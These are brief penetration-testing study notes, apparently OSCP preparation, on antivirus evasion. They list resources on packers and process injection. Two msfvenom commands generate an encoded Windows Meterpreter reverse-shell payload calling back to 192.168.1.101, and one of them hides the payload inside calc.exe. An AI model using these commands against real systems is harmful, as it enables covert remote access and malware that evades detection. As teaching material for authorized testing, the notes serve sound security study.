# Bypassing Antivirus

## Additional Resources

* [https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing\_antivirus.html](https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing\_antivirus.html)
* [https://www.shellterproject.com/](https://www.shellterproject.com/)
* [https://upx.github.io/](https://upx.github.io/)
* [https://enigmaprotector.com/](https://enigmaprotector.com/)
* [https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/](https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/)
* [https://en.wikipedia.org/wiki/Dead\_code](https://en.wikipedia.org/wiki/Dead\_code)
* [https://en.wikipedia.org/wiki/Executable\_compression](https://en.wikipedia.org/wiki/Executable\_compression)
* [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
* [https://blog.f-secure.com/memory-injection-like-a-boss/](https://blog.f-secure.com/memory-injection-like-a-boss/)
* [https://en.wikipedia.org/wiki/Windows\_API](https://en.wikipedia.org/wiki/Windows\_API)
* [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
* [https://en.wikipedia.org/wiki/Handle\_(computing)](https://en.wikipedia.org/wiki/Handle\_\(computing\))
* [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
* [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
* [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
* [https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
* [https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/](https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/)
* [https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)

## How to Find which AV Detects Malware

* find out which AV the target uses.
* upload malware to [virtustotal.com](http://virtustotal.com/) and see if the specific AV finds it

## Encoding

* can be done with msfvenom and metasploit
* notice how we set the -e flag here, and then use the shikata\_ga\_nai encoding
* not that effective since antivirus-vendors have access too

### Example

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -o meterpreter_encoded.exe
```

## Embed in Non-Malicious File

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -x calc.exe -o bad_calc.exe
```

## Encrypting the malware

* encrypt the malware and radically change the signature
* Hyperion is a great tool for malware encryption

## Tools

* [https://www.shellterproject.com/](https://www.shellterproject.com/)
* [https://enigmaprotector.com/](https://enigmaprotector.com/)
